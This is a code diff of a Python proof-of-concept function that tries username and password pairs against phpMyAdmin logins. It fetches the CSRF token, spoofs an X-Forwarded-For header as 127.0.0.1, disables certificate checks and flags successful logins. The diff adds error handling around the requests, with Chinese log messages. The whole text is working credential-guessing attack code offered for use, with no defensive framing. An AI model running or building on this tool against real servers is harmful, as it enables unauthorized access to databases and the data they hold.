@@ -68,7 +68,11 @@ def poc(url,un,pwd,proxies):
 	headers = {"Connection":"close","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","Accept-Encoding":"gzip, deflate",'Accept-Language':'zh-CN,zh;q=0.9,ga;q=0.8,en;q=0.7',"X-Forwarded-For":"127.0.0.1",'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Content-Type':'application/x-www-form-urlencoded'}
 	requests.packages.urllib3.disable_warnings()
 	session = requests.session()
-	response1 = session.get(url=url,headers=headers,proxies=proxies,verify=False)
+	try:
+		response1 = session.get(url=url,headers=headers,proxies=proxies,verify=False)
+	except:
+		print(log(url+'  连接出错1 '+un+' '+pwd))
+		return ''
 	try:
 		token = re.search('<input type="hidden" name="token" value=".*?"',response1.content.decode()).group().replace('<input type="hidden" name="token" value="','').replace('"','')
 	except:
@@ -82,7 +86,11 @@ def poc(url,un,pwd,proxies):
 	else:
 		data = 'pma_username=' + un + '&pma_password=' + pwd + '&server=1&target=index.php&token=' + token
 	url = url.rstrip('/') + '/index.php'
-	response2 = session.post(url=url,headers=headers,proxies=proxies,verify=False,data=data)
+	try:
+		response2 = session.post(url=url,headers=headers,proxies=proxies,verify=False,data=data)
+	except:
+		print(log(url+'  连接出错2 '+un+' '+pwd))
+		return ''
 	if '无法登录 MySQL 服务器' not in response2.text and response2.status_code == 200 and 'input_username' not in response2.text and 'input_password' not in response2.text:
 		print(ok('ok ' + url + ' ' + un + ' ' + pwd))
 		return 'ok'
